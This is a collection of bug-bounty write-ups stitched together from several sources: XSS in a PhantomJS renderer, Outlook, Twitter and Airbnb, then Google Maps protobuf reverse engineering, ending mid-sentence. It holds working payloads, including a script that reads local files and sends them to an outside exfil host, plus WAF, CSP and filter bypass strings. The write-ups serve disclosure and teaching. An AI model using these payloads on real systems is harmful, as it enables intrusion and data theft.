src=\"xasdasdasd\" onerror=\"document.write('<iframe src=file:///var/task/[redacted].html></iframe>')\"/>&text=&width=500&height=500 Now I know I can at least load files in /var/task/, so the next thing I want to do is see if I can load other files such as in /etc/. &header=<img src=\"xasdasdasd\" onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/> No response. 🙁 I searched for more information on /var/tasks and found out that it was related to AWS Lambda. This pointed me to a few files in the same folder that should contain source code for the Phantom plugin such as /var/task/index.js. I decided the contents of the files I have access to in /var/ may give me more information or at least contain something worth reporting. Using XHR and making Ajax requests I should be able to load the contents of the files and display them in the image or exfil it out to my server. I ran into additional issues putting this JavaScript directly in document.write and eventually found out that I could load an external script and it would circumvent these issues. Payload: &header=<img src=\"xasdasdasd\" onerror=\"document.write('<script src=\"https://xss.buer.haus/test.js\"></script>')\"/> test.js function reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('<iframe src=\"https://xss.buer.haus/exfil?data='+b64+'\"></iframe>'); } var oReq = new XMLHttpRequest(); oReq.addEventListener(\"load\", reqListener); oReq.open(\"GET\", \"file:///var/task/[redacted].html\"); oReq.send(); It's hard to show the results of this without exposing sensitive data, so here's just an idea of what you might see in your access logs. Now I was getting arbitrary file read using out-of-band JavaScript and XHR within the context of file://. I pointed the script to /etc/passwd again just to see if this might work where iframes did not. Boom! XHR had complete access to the file:// context when PhantomJS loading a file in <iframe src=\"file://\"> for some reason did not. In hindsight, the XSS payload seems really trivial but it took a lot of effort and guessing to get there. This is one of those weird bounties where you feel like you are trying to get a flag in a CTF challenge instead of trying to exploit a production server. My biggest takeaway from this was all of those weekends spent trying to beat obscure CTF challenges may have actually been useful after all."}

Then I decided to use event handler payload to check that i am getting the pop-up or not. so i tried “/><svg/onload=prompt(1);> & and now i had noticed that it has removed the onload tag from album description and it was only displaying <svg/prompt(1);> tag. So here i had noticed the behavior of the application that it is stripping out the <script> tags and also stripping out the event handlers. Then after I finally decided to use both <script> tag and event handlers to bypass the xss protection so i used ”/><svg/on<script>load=prompt(document.domain);>”/><svg/on<script>load=prompt(document.cookie);> AND Press enter or click to view image in full size Press enter or click to view image in full size i had bypassed the XSS protection over there and was able to store the malicious scripts. and after reported it was patched & rewarded with sweet bounty :) JavaScript Cross Site Scripting Xss Attack Hackerone -- -- 5 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters.

This is how Sasi used a clicking vulnerability to succesfully exploit a xss in Google http://sasi2103.blogspot.in/2016/09/combination-of-techniques-lead-to-dom.html What about a Cross site scripting that needs an arbitrary cookie? Here is how we found cross site scripting vulnerabilities in Outlook and Twitter by tossing cookies in Safari browser. Outlook Client Side Stored Cross Site Scripting Vulnerability There was a simple cross site scripting on outlook.live.com, a value from cookie was directly reflected back in the source without any filtering. Request GET / HTTP/1.1 Host: outlook.live.com User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Cookie: ClientId=vulnerable<>\"'; Connection: close Upgrade-Insecure-Requests: 1 Response snippet window.dateZero = new Date(0); var scriptStart = ((new Date()) - window.dateZero); window.clientId = 'vulnerable<>\"''; Setting the ClientId to payload ‘-alert(2)-‘ will give us a pop up but the challenge was on how to exploit the xss on other users. It’s possible if: There is CRLF injection(chances are like 1/100) There is another XSS(needs time) Ability to set an Arbitrary cookie We ruled out option one & two and started looking for 3. Luckily in next 5 minutes we found an endpoint were the application takes an user input & throws it directly into Set-cookie response headers. Now comes the fun part, %0a %0d were stripped out but , (comma) and ; were not. Ok! https://www.ietf.org/rfc/rfc2109.txt Here is how each browser reacts to a comma Chrome Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; Firefox Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; Safari Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; param2=value2; Safari accepts comma delimited cookies and now we can exploit the xss on other users. Our final payload: https://outlook.live.com/owa/?realm=hotmail.com%3b%2cClientId%3d’-alert(2)- ‘ We could also set the expiry of the cookie possibly allowing us to store our payload in the victim’s browser forever. Oh wait we could also do cookie bombing like mentioned here: http://blog.innerht.ml/page/7/ Twitter XSS by tossing cookies Refer(to understand on how to store flash messages and pass them to controller using cookies in ROR): http://api.rubyonrails.org/classes/ActionDispatch/Flash.html While doing some reconnaissance we came across an end point were one could detach an email from his account: https://twitter.com/account/not_my_account/ Request POST /account/detach_email HTTP/1.1 Host: twitter.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Origin: https://twitter.com/ Content-Length: 36 Connection: keep-alive User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4 Cookie: <redacted> authenticity_token=&user=sds\"><img src=x onerror=prompt(1)>&secret= Setting the user parameter to payload will return a 302 redirect to a controller with a flash message in cookie.

The flash message was something like this “the email address is no longer associated with payload”. This is a same story like outlook, to exploit the xss we needed to set an arbitrary cookie or a csrf. Like always we are lucky again and found an end point were a user input is directly thrown in between the set cookie response headers. Our final payload was: https://twitter.com/i/safety/report_story?next_view=report_story_start&source=reporttweet&reported_user_id=108900981&reporter_user_id=602037637&is_media=true&is_promoted=false&reported_tweet_id=723164469380018178&tweet%5B%5D=%22test%22%3b,%20_twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%25250ASGFzaHsGOgtub3RpY2VDOhdUcmFuc2xhdGFibGVTdHJpbmciblRoZSBlbWFp%25250AbCBhZGRyZXNzIGlzIG5vIGxvbmdlciBhc3NvY2lhdGVkIHdpdGggdGhlIFR3%25250AaXR0ZXIgYWNjb3VudCAodGVzdCI%25252BPGltZyBzcmM9eCBvbmVycm9yPXByb21w%25250AdCgxKT4pLgY6CkB1c2VkewY7BlQ6D2NyZWF0ZWRfYXRsKwgRECMBVAE6DGNz%25250AcmZfaWQiJTEwOWQ5ZGYxNmIzZGYyNjc1ZjgzNDY3MjA0YjlkZTI3OgdpZCIl%25250AN2M3YTdiMzJkNzBkNGM2ZjZkNTgxMmMyN2Q2M2VhZTg%25253D--b26e09e3bcf3861b841b00b2279c806126009cd0%3b%20Path=/%3b%20Domain=.twitter.com%3b,s=%22akhil Video POC: Overall it was real fun for us.

We heard a lot about this company in the past but had never used their service before. Overall they have a pretty solid website, but we were still able to discover a handful of issues. There is one vulnerability that we wanted to write about because of the level of protection in front of it. The goal of this write-up is to show others that sometimes it takes a little bit of creativity to discover potential flaws and fully exploit them. The vulnerability we discovered is a series of Cross-Site Scripting attacks that involved bypassing JSON encoding, an XSS filter, a pretty decent WAF, CSP rules, and eventually getting it to bypass Chrome's XSS auditor. Alright, diving in from the initial discovery: 1) Using a semi-colon to bypass the initial XSS filter stripping. This may not seem special, but it was an important discovery. Using a semi-colon in user input that is placed inside of <script></script> with JSON encoding would bypass a critical part of the XSS filter. As long as you placed a ; before your payload, it would prevent the XSS-filter from stripping your initial injection. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=<u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"test123\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<u>test123\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> As you can see, the <u> gets stripped from the source without a semi-colon. At this point we know that we can use an unencoded </script> to get outside of the <script></script> tag. It's not demonstrated yet, but the user-input is JSON encoded so we can't use quotes to get script execution due to it being escaped. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"</script><u>test123\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> 2) Using null-bytes to bypass part of the WAF protection and it still working due to application stripping them out. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><script>alert(1)</script>; Result: After a little bit of messing around with this, we came to the conclusion that there's a Web Application Firewall (WAF) protecting the endpoint from common web attacks. I'm not going to dive too deeply into the amount of things tested, but understand that when you are put up against a WAF that it's all trial and error. You put in a few possible payloads and go a few characters at a time until you understand what is causing the WAF to kill the request. Eventually we came to this: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript>alert/**/(1)</script>\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> There's a few things to note from this: You can use a null-byte to bypass the WAF. This is demonstrated in splitting the word script into sc%00ript. Downside? It resulted in sc\\u0000ript in the request body which is invalid. While getting to that endpoint, we discovered that no matter what we tested it was impossible to get <script> on the page. There were a few elements we could use, but iframe and script are ruled out after a bit of testing and not finding a way to trick the WAF when it came to these two strings. Even with null-bytes, it resulted in broken elements This WAF is pretty decent, but a simple attack vector was able to bypass the alert check: alert/**/(1)//. This is a good discovery going forward for testing, but it also acts as a confidence boost that the WAF can be defeated. Going beyond elements, we were curious to see what happens when we added an attribute. Of course, src=\"\" is triggering the waf and adding a null-byte on it would add the \\u0000 to it like we saw before. After a bit of messing with it, adding a random junk attribute shows that JSON encoding is messing with our payload. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript/test\":\"'asdf'>alert/**/(1)\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> If you look at the source, you can see that the equal (=) got converted into a colon (:). This is a hint that our input is being encoded, so the next step required is to break it. Without breaking the encoding, we are going to have a very very tough time getting a working payload especially when factoring in additional security layers such as CSP and browser XSS auditor. Fast-forward a bit and we landed on this URL: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript/test\":\"'asdf'/test2='asdf'>alert/**/(1)\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Now we have null-bytes that can be used to bypass the WAF and get stripped from the request body. You might be asking... how? why? What was the process going from one URL to the next. The answer is honestly just trial and error. You have to try as many things as possible and see what sticks. There are two things worth noting on this endpoint: The first attribute we include in our payload is a throwaway. Once it converts the first equal into a colon, our equals after will stop getting converted. This is probably cause the encoder now thinks we're part of the JSON value. Null-bytes are being sent with the request but they are getting stripped out of the JSON value once the encoder sees it. Putting this together, we can try to execute a payload and see what happens. We had already looked ahead and knew CSP rules would prevent it, but this is just to demonstrate what would happen if you tried: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><img/test='asdf'/sr%00c=''/on%00error=prompt> So although we have an injected <img> tag with a valid onerror executing JavaScript code, the CSP rules tell the browser to not execute the inline script. 3) Bypassing Content-Security Policy (CSP) to get script execution. If you load the listing_frame endpoint and look at the request response, you'll see that airbnb has Content-Security Policy enabled. A very basic description of CSP is that it determines where you can load content from and where you can execute script from. The first step is to view what the CSP rules are to figure out if there are any weaknesses. New to CSP? Recommended reading: High-level view: http://content-security-policy.com/ Spec: https://www.w3.org/TR/CSP/ default-src 'self' https:; connect-src 'self' https: http:; font-src 'self' https:; frame-src *; img-src 'self' https: http: data:; media-src 'self' https:; object-src 'self' https:; script-src 'sha256-q590j1fW +aERb666H10h55ePy0sxRjUYCiOmJPftXDs=' 'self' https: 'unsafe-eval' 'unsafe-inline' http:; style-src 'self' https: 'unsafe-inline' http:; report-uri /tracking/csp?action=listing_frame&controller=embed&req_uuid =cff37d5d-4c12-4c8b-b288-1ce0d103a25c&version=c7fc601874a5350c79eceb33ba6d4c09a433035f; Here are some observations on the CSP rules: default-src is set to 'self' which means it's setting all CSP rules to only allow src attribute from a same-origin. In short, you should only be able to load src from a relative endpoint. frame-src is set to wildcard (*) so we can load external src links in frames (iframe, frame, frameset). Because we're injecting HTML past the body element, we cannot use frame or frameset. The WAF has made it next to impossible to use iframe. script-src has 'self' supplied after the sha256 hashed script for unsafe-inline and unsafe-eval, but https does not have 'self' supplied meaning we can load external scripts for execution. We have a few options with this ruleset but there are two that standout: We can try to find a JSONP callback that lets us use special characters and include it as a relative path (same origin) script. We find an element that lets us load an external script for execution that does not involve iframe or script 4) The Initial Payloads. JSONP Callback On the first point, we did some Google searches and found that there are a few documented API calls that have JSONP callbacks on the www Airbnb domain. These callbacks are subjected to the WAF but they allow most special characters which means we can use it. The downside of this is that we'd need to solve a problem with the WAF bypass of getting a working injected <script>. Because we already tested this for a bit, the better solution was to see about SWFs. Embeddable SWF We quickly realized that <embed> was not being blocked by the WAF and that we could use null-bytes on the src attribute. With the CSP rules and the WAF bypass, we should be able to get JavaScript execution using this method. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><embed/test='asdf'/sr%00c='/'> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"</script><embed/test\":\"'asdf'/src='/'>\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Most XSS SWF files have GET request variables to supply a JavaScript payload. We quickly realized that the WAF was blocking all attempts at including request variables in the embed src URL. It must have some sort of detection of URLs inside of GET request vars. We had to put together a SWF file with the XSS payload built inside of it to bypass this detection. Here's the actionscript we decided to use for this attack. package { import flash.display.Sprite; import flash.external.*; import flash.system.System; public class XSSProject extends Sprite { public function XSSProject() { flash.system.Security.allowDomain(\"*\"); ExternalInterface.marshallExceptions = true; try { ExternalInterface.call(\"0);}catch(e){};alert(document.domain);//\"); } catch(e:Error) { trace(e); } } } } It's a slightly modified version of Sorough Dalili's (@irsdl) flash XSS SWF on his website: https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/ The payload: URL: https://www.airbnb.com/embeddable/listing_frame?city-link-index=;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//buer.haus/xss2.swf'//>&id=9978655 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"city-link-index\":\"\",\"</script><embed/test\":\"''/allowscriptaccess='always'/src='//buer.haus/xss2.swf'//>\",\"id\":\"9978655\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Success?! Nope, of course not. That would be too easy. Although the XSS payload was executing for one person, it wasn't for anyone else. We deduced that the WAF was using some sort of fingerprinting of both IP and browser headers such as User-Agent. Even though it worked on one IP/computer, it would not work on the same IP with a different User Agent or browser. For some people it would redirect to the base domain and for others it would simply throw the generic WAF error. What options do we have here? On one hand, we know that it fingerprinted our history of requests. If we bombard a browser with the thousands of requests we sent to get to this point it may work. Practical? Not really. So the only other option is to go back to the drawing board and start manipulating the payload until it works for everyone. Abusing some of the tricks we've already discovered, we can butcher the payload enough that the WAF no longer treats it as a threat: URL: https://www.airbnb.co.uk/embeddable/listing_frame?</script><embed%20/test=''/+allowscript%00acces%00s='al%00ways'+sr%00c='//buer.haus/xss2.swf'>&city-link-index=&id=9978655'+on%00error=al%00ert%00(1) '&action Are we finished? Nope, lol. This payload works for Firefox but it gets blocked in Chrome because of XSS auditor. 5) The Universal Payload Using the same tricks we used to confuse the WAF, we were able to defeat the auditor. This involved abusing the null-byte attack and using tabs. The final payload that works in Firefox, Chrome, Safari and bypasses all layers of protections: https://www.airbnb.co.uk/embeddable/listing_frame?</script><em;<;>;<embed /test=''/+allowscript%00acces%00s='al%00%09ways'+%09%00s%09r%00c='//buer.haus/xss2.swf'><em;&city-link-index=&id=9978655'+on%00error=al%00ert%00(1)'&action 6) Unleashing the Kraken When you have an XSS filter, you are generally relying on it universally. Although this exploit only works against JSON encoded input, Airbnb is using JSON data heavily across their entire website. Now that we have a working payload, we started to hit the rest of the website. After a short bit of exploring, we discovered 7 additional vulnerable locations including a Stored Cross-Site Scripting issue instead of just Reflected. Stored! and more! Takeaways Every time we find a vulnerability we try to put together a couple of takeaways from it. What did we learn that we can reuse later? What did we do right? What did we do wrong? How could the company have prevented this from happening? There's a lot to learn from every vulnerability that you discover and report. XSS filtering is a gamble - we think the security machine has proven time and time again that it's not a good enough solution. Some companies have filters that may be close to perfect, but we doubt they will last. Consider this: people are using browser features implemented a year ago to exploit filters built 2-3+ years ago. Developers simply cannot write code that predicts the future of browser security. Perseverance. Hit something constantly until you fully understand what is happening. If you can't, save it to a notepad and come back to it at a later date. There's a lot of bounty reports that are discoveries from a year prior but were not fully exploitable until a year later. It can be a mix of just learning more over the span of a year or having a moment of eureka. WAFs are great, but they aren't perfect. With that said, the WAF on Airbnb was actually pretty solid. Also, as a developer you need to be careful striping garbage from a request because it can be a quick way for an attacker to circumvent WAFs and browser XSS detection.

Or maybe Google Street View, I love Street View, it’s like a retrofuturistic way to teleport. Routinely, I looked at the address bar. Since sometime in 2014, parameters are not the mere query string they used to be. Instead, it’s a weird mash of alphanumeric characters separated by exclamation points. It’s abstruse, it has no public documentation whatsoever, it’s used by people everyday, it’s a reverse engineerable protocol. That’s the kind of code I want to break. The Google Maps URL parameter format I also looked at the browser’s web console. Not only requests to the AJAX API were encoded the same way, but if some of responses were images, others were a novel signature followed with cryptic binary data. With that much mystery to solve, what could restrain any more my motivation? Nothing. Opening the hood Google Maps is a piece of about 3.2 MB of minified Javascript. Google Earth felt heavy — yesterday’s Google Maps was a dumb slippy map, today’s Google Maps has a Earth mode. It renders 3D graphics with WebGL, has large tiles, requests and display caching, scheduling and planning modules implemented in Javascript, and all that stuff . With a codebase of this size, you got to be organized. That’s fortunate, all (both) major browsers have landed their own debuggers these last years, as in, breakpoints can be set in any functions you wish to, and even when an AJAX request or a DOM event fires. Most things in reverse engineering have either a static or dynamic way to solve, I’m mostly a static guy that will use dynamic analysis in extreme cases, because I like detail and the sweet feeling of losing itself to assembly. This will however get useful a bit later. Let’s get to the code — Google Maps loads about eight Javascript code files, some in workers and through XMLHttpRequest, that have linebreaks only to separate modules. Javascript modules are designated with two or three-letter codes in the URLs. It’s minified with Closure Compiler , Google’s minifier which can inline functions, put half of your function’s statements in a conditional expression, separated with simple commas, and even more magic. Getting back code to readable enough (indented) is doable within your browser web’s console, or with a simple tool like http://jsbeautifier.org/ . Press enter or click to view image in full size The requests loading Google Maps’s source, and some minified code Getting used to read this kind of output may frighten some, but is not very hard. Just like when you read assembly, you learn to go straight to the point: search for strings and constants a lot, jump from a referred to function to another, take notes in your txt, sometimes, guess what the function could be doing upon a look, and all these things. For example, what could searching for an exclamation point string do… Oh already. Press enter or click to view image in full size Some of the code of the function that does the mysterious kind of URL encoding — apparently. With observation, you quickly notice that URLs parameter strings (shown again in screenshot below) are made of, repeated indefinitely: An exclamation point: the separator. A number: it looks like an integer key, in a key/value pair. A single letter: it’s a type that determines what follows. “s” is a string, “i” is an integer, but there’s more… Either a number, or a string: the value in the key/value pair. Press enter or click to view image in full size A screenshot from Chrome’s web console, showing requests to various AJAX endpoints. Could it be a novelty serialization format? In fact, after sorting out what I could remember about serialization, it wasn’t novelty. It was Protobuf. Protobuf is a format that’s used for (storing, enabling communication with) absolutely anything at Google. It was modestly developed as version 1 in 2001, made public as version 2 in order to overthrow XML in 2008, improved somewhat as version 3 in 2016, and now it’s mostly what will power your communication with “Google’s new API platform” and it’s used more and more in the web frontend parts of Google products, now that it is everywhere in Android’s. However, Protobuf is mostly transported (on the network) as binary data. We found text. When you create a program using Protobuf , you first define (in a format, called .proto, that has a slightly C-looking syntax) pairs of key-value fields, where each field has a type, a name and a number. Moreover, you put these fields in blocks having names, called messages; a field can be an integer, a string, or made up of another message (it’s called a nested message). There are also other types I won’t describe now. Samples of what Protobuf message definitions looks like (.proto format). Then, you compile your .proto to code. That’s right, code in any language you want (there are many bindings) that will allow you to either read or write the Protobuf messages you defined, fast. In our example, the “Person” Protobuf message is turned into a “Person” Java class The programmer then sets Protobuf fields to its data (through calling code that was generated at the previous step), and when it’s done tells the library to serialize it in a binary form. The programmer invokes the “Person” class and sets data Resulting data is encoded as such: 8-bit tags where you have 5 bits for the field number, 3 bits for the field data type; then, the actual data: an integer or string or bytes or message or… (there are twelve different integer types , with half as much ways to encode them on the wire). Data is serialized in a binary form So, could the URL parameter data be the same thing, encoded using text instead? That would have barely identical meaning, in the format used to encode URL information. It turned out that while there are only five different data types in the binary format (0: variable-length integer, 1: fixed 64 bits, 2: string or bytes or message, 5: fixed 32 bits, 3 and 4: groups that were basically a deprecated way to define messages — just enough information to skip content you don’t want or know how to read without interpreting it), there are 18 different characters that can sit as the letter designating type in Google Maps’ URL. // This function, found in Google Maps' code, says which type character should map to what default field value: dba = function(a) { switch (a) { case \"d\": case \"f\": case \"i\": case \"j\": case \"u\": case \"v\": case \"x\": case \"y\": case \"g\": case \"h\": case \"n\": case \"o\": case \"e\": return 0; // Those are integers (and enum)... case \"s\": case \"z\": case \"B\": return \"\"; // Those are string/bytes... case \"b\": return !1; // This one is boolean... default: return null // And there's also \"m\" for messages, referenced in further serialization code } }; That’s just about the number of types you can use when you define fields in your .proto. But, which one maps to which? Also, could we reconstruct all the fields used in Google Maps’ URLs into readable .proto definitions; so we can edit and replay messages, and find possibly hidden fields? Which approach to use? We’ll reply to this very soon. No, we’ll think about this right now: the function calls that defines Protobuf messages and their fields seem to be scattered around multiple functions, across Javascript code. It would be hard to scrape with a bunch of regexes, and we are lazy today. Press enter or click to view image in full size We don’t want to make sense of this. What about a dynamic approach: positioning ahead of the function that serializes the “!”-separated URL data, waiting for structure information to come, somehow automating the use of the debugger? Communicating with that magic silicon-traversing glue called code, that allows you to talk to machines like you do with humans? The first magical script Yep, it turned out Chrome has a debugger API that even powers the debugger (the debugger is itself a bunch of HTML and browser Javascript that communicates with this API through Websocket). And Firefox and Safari and Edge and others have too, even though it’s not perfectly portable . Anyway, Chrome’s one works a bit better, so we’ll use Chrome’s. As matter of a fact, it’s even meant to replace most PhantomJS uses once a feature called “ headless Chrome ” will land. The first part connecting to it is launching your usual Chrome, with the --remote-debugging-port=<port number> flag. Connecting to the specified port leads you to a HTTP server, on which you make a request to the “/json” endpoint that conveniently lists active tabs and Websocket URLs to connect to the debugger API for each. Then, you exchange JSON request/response/event messages on the socket in a simple way. A request will have a constant ID and map either to a response or error; events can be enabled using specific requests. Press enter or click to view image in full size Some Websocket communication between Chrome and the Chrome developer tools (captured using Chrome developer tools themselves) Let’s get our hands dirty: we’ll first call “Runtime.enable” in order to catch the “ Runtime.executionContextCreated ” event, that will fire when a page’s Javascript execution context is created; then, “Debugger.enable”, enabling the “ Debugger.scriptParsed ” event to fire when a script is loaded so we can look at it, and find functions that interests us to put breakpoints at these; “Network.enable”, so that we are notified about all HTTP requests in order to see which ones contain “!”-encoded data that we intercepted at Javascript level, and make a direct link between .proto definitions and HTTP endpoints; and finally “ Page.navigate ”, a simple way to tell “Browser, lead us to Google Maps!”. Code snip: some commands sent at Websocket creation, and the begin of event loop When a new script is seen, the “ Debugger.scriptParsed ” event is triggered. We then call “Debugger.pause” (in order to avoid any race condition) and “ Debugger.getScriptSource ”, that will give us ability to find our relevant function with a regex or string signature, and call “ Debugger.setBreakpoint ” to set a breakpoint, specifying script ID, line and column numbers. Here is the Javascript function that we want to break in: _.Eqa.prototype.H = function(a, b) { var c = Array(Fqa(a, b)); Gqa(a, b, c, 0); return c.join(\"\") }; It takes two arguments: “b”, a Javascript object that defines the structure of the Protobuf message; “a”, another, simpler object that defines message data, that will be serialized using this structure; and returns “c”, the raw “!”-separated data string. “Fqa” calculates the size of the output array (4 * the number of fields, each field being made of four substrings that will be joined together: separator, field number, type character, field value), “Gqa” writes to it, String.prototype.join converts it to string. So we’ll want to look at “b” and get it into a readable .proto, and remember “c” for later, so we can observe in which request it is sent. This means putting a breakpoint on the last line. Here’s what argument data looks like seen from the debugger: Press enter or click to view image in full size Sample data for the “a”, “b” and “c” local variables, respectively. After some deduction, we conclude “b” structure’s would look like this: However, I have shown you a readable version, just figure the same with random letters instead of any text names and no comments. Most object attributes are minified (and change depending on the minifier run), so we’ll have to use regexes on code to know which attributes correspond to what information. We understand what this data means: next, generate the actual .proto. We could access directly variables and object attributes through the debugger API, however, this would be awfully slow so we can’t really. We could try to convert it to JSON, but this will mostly not work, as nested messages can refer to their parent, and this would result in circular references (references to a parent object from its children). Third and right solution: just inject Javascript, let it do the work, return the string through any medium (I’ll use the console API for reasons). Javascript can be evaluated through the “ Debugger.evaluateOnCallFrame ” call locally, “ Runtime.evaluate ” call globally. Conveniently, you are notified of console messages through the “ Runtime.consoleAPICalled ” event. In addition to capturing network requests (“ Network.requestWillBeSent ” event), we’ll also inject another bit of Javascript in order to hook the history.replaceState() API function, so we know when the main page changes its URL containing “!”-separated state data. Some more code written, we launch the script controlling our Chrome instance, we conduct some Google Maps interaction to let it collect data, we now have the two elements we needed: reconstructed .proto structures, samples of URLs with the serialized data. The former will be written to disk in their regular form, the latter as convenient JSON with samples of requests put in arrays for every endpoint. Some of the reconstructed .proto data Some of the network endpoints, with captured data samples for each Great. Now, what should we make of this? The second nifty program I don’t know if you like large control panels full of buttons, I bet you love picking randomly at these when you can. That’s what we’ll construct out of the dataset we cultivated. Protobuf messages are conveniently rendered as the GUI element called tree view; handy manipulation would be hard in mere command line. Protobuf fields inferred out of the structures we seen have no names. We assigned one-letter names to them, as in minified code. We want to name them after what they actually do, for that, we’ll observe, and a convenient way to observe fast (for example, using your mouse wheel to mutate an integer field) would be great. We also want to test all values, so basically, as we know what they do, we could for instance integrate reverse engineered structures elsewhere to build something brand new, or see whether some of them induce an interesting behaviour security-wise… I like to use Python for everything, the first script used Python, the second one will use Python with Qt. The solution looks simple: using the QTreeWidget widget to render the message, each field will be a subclassed QTreeWidgetItem (with children widgets such as QLabel for text, QSpinBox for integers, etc.). The code will eventually get to look a little bit entangled, as we’ll have to handle cases such as repeated fields (duplicating themselves on the UI when you fill one first), states of a field being checked, present in request, etc. But overall readable and way understandable. The output page will be rendered live using QtWebEngine , the convenient Qt module that superseded QtWebKit and allows you to integrate Blink (in fact, a larger detached portion of Chromium) as a frame in your application. Also, a text area to display side information such as response hash, size, response code, mimetype. So, you touch buttons, I want the response to render live, and slick experience, got it? Got it, after a few more hundred LoC, it’s implemented and shiny. Press enter or click to view image in full size The Protobuf editor, our second creation, a slick way to edit and replay network data we captured at the previous step. The 0-day The whole request to the endpoint requesting a Google Maps tile ( https://www.google.com/maps/vt ) has about 730 fields, scattered around 125 messages. From a security point of view, that’s great, because that’s attack surface, and as much of these fields are implicit, hidden and required a reverse engineering work to get there, that’s as much things untested from the public we can see. Now I kept testing a lot of fields by hand, sometimes documenting what they do. Most of these didn’t seem to do anything in the current setup I tried them. Eventually, I sorted out the important parts of the request. First, the coordinates on the map. There are multiple ways to describe these, regular decimal WGS84, or a larger and more precise coordinates unit, useful for the satellite view, and there are also other ways to define a viewport, for example if you want a map of a given pixel size to cover a precise area. There’s basically every way you would want to render a map. There are also all kinds of map layers, options to render labels on the map, position markers, draw an itinerary from a direction to another, cover all Maps features being drawn server-side, etc. But more important, it doesn’t only render bitmap. It also renders vector; the Android application used vector for years, the web more recently and for part of the requests. There are multiple formats for vector, all of these are proprietary. The former was a regular binary format (signature “ DRAT ”), with binary structures convenient to what it’s meant to store (map rendering data), and a version number to determine when a fields appears, changes meaning or disappears; data was obfuscated out of a simple RC4 key made out of tile coordinates, a fixed key and a nonce (I found a research paper (p. 71) briefly describing it, with a now outdated decryption key) and ZLIB, and is still in use by the Android application. The proprietary “DRAT” format is used to transport maps in a vector format to the Android client. The new one, integrated to the web application just uses binary Protobuf — again, that’s a second form of Protobuf in the web app. A single-byte xor is used instead of RC4, what a ramp up in efficiency. That’s the binary data sent through AJAX that we mentioned earlier, encapsulated in a mere length-value container format (signature “XHR1”). Transmitted data has mostly the same meaning as in the old (I made a small script to mostly render it to SVG just to spend time, it kind of works but would hardly be useful to a lot of people and could attract C&D’s, so this is left as an exercise for the reader). You can pick any of these formats versions, more than a dozen. One of these versions, specifically, was interesting. How? It was output with a “Content-Type: text/html” header. Yet, it was plain binary data. It was Protobuf-based like the new format, yet it had the header of the former one, so it had the same RC4+ZLIB processing. However, having a lot of options is interesting in security. And so there was a field that disabled encryption, and another one for compression. And you had raw map data, including the raw strings for places and markers, served as text/html to your browser. What’s a cool way to inject arbitrary strings to the map? Placing markers ! Editing other request fields does allow you to do that. Placing a arbitrarily named marker on the map, by editing request information. On this screenshot, this is done while requesting map tiles in a raster format (PNG). Once you try to do that while also setting fields relevant to enabling the 